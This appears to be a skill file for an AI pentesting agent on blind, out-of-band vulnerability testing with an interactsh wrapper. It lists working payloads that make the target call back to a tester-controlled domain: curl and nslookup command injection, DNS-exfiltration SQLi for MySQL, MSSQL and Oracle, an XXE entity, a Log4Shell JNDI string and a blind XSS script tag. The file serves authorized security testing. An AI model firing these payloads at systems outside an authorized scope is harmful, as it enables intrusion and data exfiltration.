---
name: oob-testing
description: Call this skill to test blind / out-of-band (OOB) vulnerabilities — blind SQLi, SSRF, blind RCE/command injection, OOB XXE, Log4Shell/JNDI, and blind XSS — where there is no response reflection and the only proof is the target making an outbound DNS/HTTP/SMTP callback. Uses the `oob` helper (projectdiscovery interactsh).
---

# OOB / Blind Vulnerability Testing (interactsh)

Some vulnerabilities produce **no visible change in the HTTP response** — the only
observable effect is the target reaching out to an attacker-controlled host
(a DNS lookup, an HTTP request, an SMTP connection). You confirm these by
planting a **unique callback domain** in a payload and watching for the hit.

The `oob` helper (a wrapper over `interactsh-client`) is available directly in
**bash**. It runs a background listener on the public interactsh servers and logs
every interaction, so you can start a session, fire payloads, then poll.

## Workflow

```bash
D=$(oob new)        # start a session, prints your unique domain, e.g. c9x1a.oast.site
echo "$D"
# ... embed $D in one or more payloads against the IN-SCOPE target ...
oob poll            # list the DNS/HTTP/SMTP callbacks received so far
```

- `oob new` — start a session and print the unique OOB domain. (Re-running starts a fresh session.)
- `oob domain` — reprint the current domain.
- `oob poll` — show interactions received so far (timestamp, protocol, source IP, id).
- `oob raw` — dump the raw JSON interactions (full request/headers).
- `oob stop` — end the session.

**A DNS or HTTP callback carrying your domain is proof the target processed your
payload and initiated an outbound connection.** Record it with `report_finding`,
pasting the `oob poll` / `oob raw` output as evidence.

## When to use it (and the payloads)

Use a **distinct subdomain label per injection point** so you can tell which one
fired — e.g. `ssrf1.$D`, `hdr-xff.$D`. (Any label under `$D` resolves and is logged.)

- **SSRF** — put the domain in a URL/host field:
  `curl "https://target/api/fetch?url=http://ssrf.$D/"`  then `oob poll` for an HTTP hit.
- **Blind command injection / RCE** — append an OOB trigger:
  `; nslookup rce.$D` · `| curl http://rce.$D/` · backticks `` `curl http://rce.$D` ``.
- **Blind SQLi (DNS exfil)**:
  - MySQL (Windows, needs FILE): `... UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.sqli.'"$D"'\\abc'))`
  - MSSQL: `';EXEC master..xp_dirtree '\\sqli.'+$D+'\x';--`
  - Oracle: `(SELECT UTL_INADDR.get_host_address('sqli.'||$D) FROM dual)`
- **OOB XXE** — external entity to your host:
  `<!DOCTYPE r [<!ENTITY % p SYSTEM "http://xxe.$D/e"> %p;]>`
- **Log4Shell / JNDI** — in any logged header/field (User-Agent, etc.):
  `${jndi:ldap://log4j.$D/x}`  (an LDAP/DNS lookup to the domain confirms it).
- **Blind XSS** — payload that beacons on render in another user's browser/panel:
  `"><script src=//xss.$D></script>`  then poll later (may fire minutes/hours later).

## Interpreting results & caveats

- **Only in-authorized-scope targets.** OOB payloads make the target connect to a
  third-party (public interactsh) server; keep testing within the engagement scope.
- **DNS-only hit, no HTTP** usually still confirms the sink resolved your domain
  (enough for blind SQLi/XXE DNS exfil). HTTP/LDAP hits are stronger.
- **False positives**: scanners, link-preview bots, AV/proxies, and the target's
  own DNS resolver may pre-fetch a URL. Prefer a **unique label per payload** and
  correlate the hit's timing/source with your request before reporting.
- **No callback ≠ not vulnerable** — egress may be firewalled. Note it and, where
  possible, fall back to a timing/error-based blind technique.
- The session lives in the background; `oob poll` works from any later step. For
  slow sinks (blind XSS, queued jobs) poll again after a delay.
